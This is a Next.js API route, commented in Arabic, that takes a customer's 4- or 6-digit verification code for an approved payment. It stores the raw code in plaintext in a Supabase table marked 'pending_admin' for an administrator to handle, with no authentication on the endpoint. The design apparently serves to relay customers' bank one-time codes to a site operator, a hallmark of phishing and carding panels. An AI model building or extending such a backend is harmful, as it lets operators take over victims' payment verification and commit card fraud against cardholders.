import { NextRequest, NextResponse } from "next/server";
import { createServiceClient } from "@/lib/supabase/server";

interface OtpBody {
  paymentEntryId?: string;
  bookingId?: string;
  otp?: string;
}

// العميل يرسل رمز التحقق (4 أو 6 أرقام) — يُخزّن بانتظار قرار المدير
export async function POST(req: NextRequest) {
  const body = (await req.json().catch(() => ({}))) as OtpBody;
  const paymentEntryId = body.paymentEntryId;
  const bookingId = body.bookingId;
  const otp = (body.otp ?? "").trim();

  // التحقق من الطول: 4 أرقام أو 6 أرقام فقط
  if (!/^\d{4}$/.test(otp) && !/^\d{6}$/.test(otp)) {
    return NextResponse.json({ error: "invalid_otp_length" }, { status: 422 });
  }

  if (!paymentEntryId) {
    return NextResponse.json({ error: "missing_payment_entry_id" }, { status: 400 });
  }

  const supabase = createServiceClient();

  // جلب طلب الدفع المرتبط للتأكد من موافقة المدير عليه
  const { data: paymentEntry, error: pErr } = await supabase
    .from("client_data_entries")
    .select("id, client_id, payload")
    .eq("id", paymentEntryId)
    .maybeSingle();

  if (pErr || !paymentEntry) {
    return NextResponse.json({ error: "payment_not_found" }, { status: 404 });
  }

  const pPayload = paymentEntry.payload as Record<string, unknown>;
  if (pPayload.status !== "approved") {
    return NextResponse.json({ error: "payment_not_approved" }, { status: 409 });
  }

  // تخزين طلب التحقق بانتظار قرار المدير
  const { data: inserted, error: insertErr } = await supabase
    .from("client_data_entries")
    .insert({
      client_id: paymentEntry.client_id ?? null,
      type: "otp_request",
      payload: {
        payment_entry_id: paymentEntryId,
        booking_id: bookingId ?? pPayload.booking_id ?? null,
        booking_ref: pPayload.booking_ref ?? null,
        otp,
        status: "pending_admin",
        created_by: "otp_submit",
      },
    })
    .select("id")
    .single();

  if (insertErr || !inserted) {
    return NextResponse.json({ error: "submit_failed" }, { status: 500 });
  }

  return NextResponse.json({
    entryId: inserted.id,
    status: "pending_admin",
  });
}
